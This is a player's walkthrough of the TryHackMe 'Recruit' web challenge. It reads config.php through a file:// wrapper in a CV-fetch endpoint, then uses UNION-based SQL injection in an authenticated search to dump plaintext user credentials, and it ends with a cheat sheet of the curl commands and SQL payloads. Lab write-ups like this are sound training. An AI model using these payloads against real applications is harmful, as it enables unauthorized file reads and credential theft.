# Recruit Web Challenge

Room: https://tryhackme.com/room/recruitwebchallenge

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: [https://github.com/garthheff/CTF-Hints/](https://github.com/garthheff/CTF-Hints/blob/main/recruitwebchallenge.md)

---


## Overview

Recruit is a web challenge focused on abusing exposed functionality in a recruitment portal. The goal is to gain an initial foothold as an HR user, then escalate access and ultimately log in as the administrator.

The main chain was:

1. Enumerate the web application.
2. Discover `sitemap.xml`.
3. Use the exposed API documentation to identify the CV retrieval endpoint.
4. Abuse `file.php?cv=` with a `file://` wrapper to read `config.php`.
5. Use the recovered HR credentials to log in.
6. Exploit SQL injection in the authenticated search feature.
7. Dump the `users` table and recover the administrator login.

---

## Host Setup

The web application expects the hostname `recruit.thm`, so add it to `/etc/hosts`.

```bash
echo '10.49.191.57 recruit.thm' >> /etc/hosts
```

Confirm the host resolves and the site is reachable.

```bash
curl -i http://recruit.thm/
```

---

## Initial Enumeration

During enumeration, `sitemap.xml` was discovered.

```bash
curl -i http://recruit.thm/sitemap.xml
```

The sitemap exposed several useful paths:

```xml
<urlset>
<!-- Public Pages -->
<url>
<loc>http://recruit.thm/</loc>
<changefreq>daily</changefreq>
<priority>1.0</priority>
</url>
<url>
<loc>http://recruit.thm/index.php</loc>
<changefreq>daily</changefreq>
<priority>1.0</priority>
</url>
<!-- API & Documentation -->
<url>
<loc>http://recruit.thm/api.php</loc>
<changefreq>weekly</changefreq>
<priority>0.8</priority>
</url>
<!-- CV Retrieval Service -->
<url>
<loc>http://recruit.thm/file.php</loc>
<changefreq>weekly</changefreq>
<priority>0.6</priority>
</url>
<!-- Mails -->
<url>
<loc>http://recruit.thm/mail/</loc>
<changefreq>monthly</changefreq>
<priority>0.5</priority>
</url>
<!-- Authenticated Pages -->
<url>
<loc>http://recruit.thm/dashboard.php</loc>
<changefreq>weekly</changefreq>
<priority>0.4</priority>
</url>
<url>
<loc>http://recruit.thm/logout.php</loc>
<changefreq>monthly</changefreq>
<priority>0.2</priority>
</url>
<!-- Static Assets -->
<url>
<loc>http://recruit.thm/assets/</loc>
<changefreq>monthly</changefreq>
<priority>0.1</priority>
</url>
<!--

        Notes:
        - Some directories may contain internal documentation or logs.
        - Certain endpoints are intended for internal HR integrations.
        - Access to sensitive data is role-restricted.
    
-->
</urlset>
```

Important paths from the sitemap:

```text
/api.php
/file.php
/mail/
/dashboard.php
/logout.php
/assets/
```

The comments are also useful. They hint that some directories may contain internal documentation or logs, and that certain endpoints are intended for internal HR integrations.

---

## Mail Log Discovery

The `/mail/` directory had directory listing enabled and contained a mail log.

```bash
curl -i http://recruit.thm/mail/
```

The mail log contained an important deployment note.

```text
May 14 09:32:11 recruit-server postfix/smtpd[2143]: connect from hr-workstation.local[10.10.5.23]
May 14 09:32:12 recruit-server postfix/smtpd[2143]: 4F1A2203F: client=hr-workstation.local[10.10.5.23]
May 14 09:32:13 recruit-server postfix/cleanup[2146]: 4F1A2203F: message-id=<20240514093213.4F1A2203F@recruit.local>
May 14 09:32:13 recruit-server postfix/qmgr[1789]: 4F1A2203F: from=<hr@recruit.thm>, size=1824, nrcpt=1 (queue active)
May 14 09:32:14 recruit-server postfix/local[2151]: 4F1A2203F: to=<it-support@recruit.local>, relay=local, delay=0.34, status=sent

------------------------------------------------------------
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>
Date: Tue, 14 May 2024 09:32:10 +0000
Subject: Recruitment Portal Deployment Confirmation

Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

Weâ€™ve completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.

Thanks,
HR Operations
Recruitment Team
------------------------------------------------------------

May 14 09:32:14 recruit-server postfix/qmgr[1789]: removed
```

This gave us two important clues:

```text
HR username: hr
HR credentials are stored in config.php
Administrator credentials are stored in the backend database
```

At this point, the target was likely to involve reading `config.php`, logging in as `hr`, and then abusing something database-backed to recover the administrator credentials.

---

## API Documentation

The sitemap pointed to `api.php`.

```bash
curl -i http://recruit.thm/api.php
```

The API documentation provided several hints.

```text
The Recruit API is used internally to fetch and process candidate CVs from external sources during the recruitment process.
```

```text
You can fetch a candidate CV using the following endpoint:
/file.php?cv=<URL>
```

```text
The API supports fetching CVs from external URLs such as HTTP and HTTPS.
```

```text
Requests targeting restricted locations may be blocked by the API.
```

The obvious assumption was that `file.php?cv=` accepted HTTP or HTTPS URLs. A lot of testing with `http://`, `https://`, localhost, vhosts, and SSRF bypasses only returned the same error:

```text
Only local files are allowed
```

This suggested the message was misleading, or that the endpoint accepted URL-style input but not necessarily only HTTP and HTTPS.

---

## Reading config.php

The breakthrough was using a `file://` wrapper.

```bash
curl -i -G --data-urlencode 'cv=file:///var/www/html/config.php' 'http://recruit.thm/file.php'
```

This allowed reading the application configuration file.

The config contained the HR credentials.

```text
username: hr
password: [REDACTED]
```

The password is redacted here for the walkthrough, but it was recovered in plaintext from `config.php`.

---

## Logging in as HR

Using the recovered credentials, we logged in as `hr`.

The login form used a simple POST request.

```http
POST / HTTP/1.1
Host: recruit.thm
Content-Type: application/x-www-form-urlencoded

username=hr&password=[REDACTED]&login=
```

After logging in, the dashboard became accessible.

```text
/dashboard.php
```

The dashboard contained a search function for candidate records.

---

## Testing the Search Function for SQL Injection

The search feature appeared to query candidate data from the database.

A simple SQL injection test returned all records:

```text
test' OR 1=1-- 
```

This confirmed SQL injection in the authenticated search area.

Next, we tested for UNION-based SQL injection.

A three-column UNION failed.

```sql
' UNION SELECT 1,2,3-- -
```

The application returned a SQL error:

```text
SQL Error:
The used SELECT statements have a different number of columns
```

This means the original query did not return three columns.

A four-column UNION worked.

```sql
' UNION SELECT 1,2,3,4 -- -
```

The output confirmed that four columns were required.

```text
1    2    3    4
```

---

## Finding the Current Database

With the column count known, we queried the current database name.

```sql
' UNION SELECT 1,database(),3,4 -- -
```

The result showed:

```text
recruit_db
```

So the active database was:

```text
recruit_db
```

---

## Enumerating Tables

Next, we queried `information_schema.tables` to list tables in `recruit_db`.

```sql
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='recruit_db' -- -
```

The interesting tables found were:

```text
candidates
users
```

The `users` table was especially interesting because the mail log said administrator credentials were stored in the backend database.

---

## Enumerating Columns in users

Next, we queried `information_schema.columns` for the `users` table.

```sql
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_schema='recruit_db' AND table_name='users' -- -
```

The columns returned were:

```text
1    id          3    4
1    password    3    4
1    username    3    4
```

So the `users` table contained:

```text
id
username
password
```

---

## Dumping User Credentials

With the table and column names known, we dumped the `users` table.

```sql
' UNION SELECT id,username,password,4 FROM users -- -
```

This returned the user records, including the administrator login.

```text
id    username         password
1     hr               [REDACTED]
2     administrator    [REDACTED]
```

The administrator password was stored in plaintext.

---

## Administrator Login

Using the recovered administrator credentials, we logged out of the HR account and logged in as the administrator.

```text
username: administrator
password: [REDACTED]
```

This completed the objective.

---

## Attack Chain Summary

```text
1. Add recruit.thm to /etc/hosts
2. Discover sitemap.xml
3. Identify /api.php, /file.php, /mail/, and /dashboard.php
4. Read mail log from /mail/
5. Learn that HR credentials are stored in config.php
6. Review API docs and identify /file.php?cv=<URL>
7. Abuse file:// wrapper to read /var/www/html/config.php
8. Recover HR credentials
9. Log in as hr
10. Find authenticated search feature
11. Confirm SQL injection with test' OR 1=1-- 
12. Determine UNION column count
13. Find database name with database()
14. Enumerate tables from information_schema.tables
15. Enumerate users columns from information_schema.columns
16. Dump users table
17. Recover administrator credentials
18. Log in as administrator
```

---

## Key Commands and Payloads

### Read config.php

```bash
curl -i -G --data-urlencode 'cv=file:///var/www/html/config.php' 'http://recruit.thm/file.php'
```

### Confirm SQL Injection

```sql
test' OR 1=1-- 
```

### Failed UNION Test

```sql
' UNION SELECT 1,2,3-- -
```

Output:

```text
SQL Error:
The used SELECT statements have a different number of columns
```

### Working UNION Test

```sql
' UNION SELECT 1,2,3,4 -- -
```

### Get Database Name

```sql
' UNION SELECT 1,database(),3,4 -- -
```

Output:

```text
recruit_db
```

### List Tables

```sql
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='recruit_db' -- -
```

Output included:

```text
candidates
users
```

### List users Columns

```sql
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_schema='recruit_db' AND table_name='users' -- -
```

Output:

```text
id
password
username
```

### Dump users Table

```sql
' UNION SELECT id,username,password,4 FROM users -- -
```

Output included:

```text
admin:[REDACTED]
```

---

## Notes

The main trick in this room was not assuming the API documentation was fully honest. The docs suggested HTTP and HTTPS URLs, but the useful bypass was treating `cv=` as a URL-like input and using the `file://` scheme.

The second stage was a classic authenticated SQL injection. Once logged in as HR, the search feature accepted injectable input, and the administrator credentials could be recovered from the database using UNION-based queries against `information_schema`.
